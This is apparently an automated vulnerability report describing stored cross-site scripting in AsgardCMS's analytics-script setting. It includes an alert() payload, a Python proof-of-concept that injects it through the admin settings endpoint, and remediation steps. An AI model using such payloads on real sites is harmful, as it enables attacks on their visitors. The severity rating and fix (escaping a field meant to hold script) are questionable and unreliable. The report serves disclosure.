# Stored Cross-Site Scripting (XSS) in Analytics Script Setting

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-03-29 08:50:17 UTC
**Target:** /workspace/Platform
**Endpoint:** All pages using master layout
**Method:** GET
**CWE:** CWE-79
**CVSS:** 9.0

## Description

A critical stored cross-site scripting vulnerability was discovered in the analytics script functionality of AsgardCMS. The vulnerability allows arbitrary JavaScript execution by injecting malicious code into the analytics script setting, which is then rendered unescaped on every page of the website.

## Impact

An attacker with access to modify settings (or through settings injection) can:
- Execute arbitrary JavaScript in the context of all users visiting the site
- Steal session cookies and authentication tokens
- Perform actions on behalf of authenticated users
- Redirect users to malicious websites
- Deface the website
- Perform client-side attacks against users

## Technical Analysis

The vulnerability exists in the master layout template where the analytics script setting is output unescaped using Blade's `{!! !!}` syntax:

```php
{!! Setting::get('core::analytics-script') !!}
```

This setting value is stored in the database and rendered without any HTML escaping, allowing JavaScript injection. The vulnerability affects all pages that use the master layout template.

## Proof of Concept

To reproduce this vulnerability:

1. Access the settings management section of AsgardCMS admin panel
2. Modify the "Analytics Script" setting to include malicious JavaScript
3. Example payload: `<script>alert('XSS')</script>`
4. Visit any page of the website to see the JavaScript execute
5. The script will execute for every visitor to the site

```
# Stored XSS PoC for AsgardCMS Analytics Script
def exploit_xss(target_url, admin_session_cookie):
    # Malicious JavaScript payload
    payload = "<script>alert('XSS Exploit')</script>"
    
    # Update analytics script setting via admin panel
    response = requests.post(
        f"{target_url}/admin/settings",
        data={
            "core::analytics-script": payload,
            "_token": "csrf_token_here"  # CSRF token required
        },
        cookies={"session": admin_session_cookie},
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    
    # Verify the XSS payload is stored and executed
    response = requests.get(target_url)
    if payload in response.text:
        print("Stored XSS payload successfully injected")
    else:
        print("XSS injection failed")

# Usage
exploit_xss("http://target-asgardcms-instance", "admin_session_cookie_value")
```

## Code Analysis

**Location 1:** `Themes/Flatly/views/layouts/master.blade.php` (line 28)
  Stored XSS vulnerability - unescaped output of user-controlled setting
  ```
  {!! Setting::get('core::analytics-script') !!}
  ```

  **Suggested Fix:**
```diff
- {!! Setting::get('core::analytics-script') !!}
+ {{ Setting::get('core::analytics-script') }}
```

## Remediation

1. Use proper output escaping with Blade's `{{ }}` syntax
2. Replace the vulnerable code with:

```php
{{ Setting::get('core::analytics-script') }}
```

3. If HTML content is required, use Laravel's `htmlspecialchars()` or `e()` helper:

```php
{!! e(Setting::get('core::analytics-script')) !!}
```

4. Implement content security policy (CSP) headers
5. Validate and sanitize all settings inputs before storage
6. Consider using a dedicated analytics module instead of raw script injection
